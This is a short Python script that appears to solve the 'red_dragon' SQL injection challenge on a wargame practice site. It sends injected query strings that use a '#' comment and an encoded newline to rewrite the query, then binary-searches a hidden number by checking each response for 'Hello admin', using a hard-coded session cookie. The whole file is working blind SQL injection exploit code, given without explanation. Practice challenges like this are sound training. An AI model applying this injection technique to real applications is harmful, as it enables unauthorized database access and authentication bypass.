import requests

url = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?id=%27||no<%23&no=%0a"
url2 = "https://los.rubiya.kr/chall/red_dragon_b787de2bfe6bc3454e2391c4e7bb5de8.php?id=%27||no=%23&no=%0a"
cookies = {"PHPSESSID" : "595dl7ejl1io50mt9bhg0dbmpk"} 

start,end = 100000000,1000000000
while True:
    search = int((start + end)/2)
    response = requests.get(url + str(search),cookies=cookies)
    if("Hello admin" in response.text):
        end = search
    else:
        response = requests.get(url2 + str(search),cookies=cookies)
        if("Hello admin" in response.text):
            print("find the no",search)
            break
        start = search
    print(search)

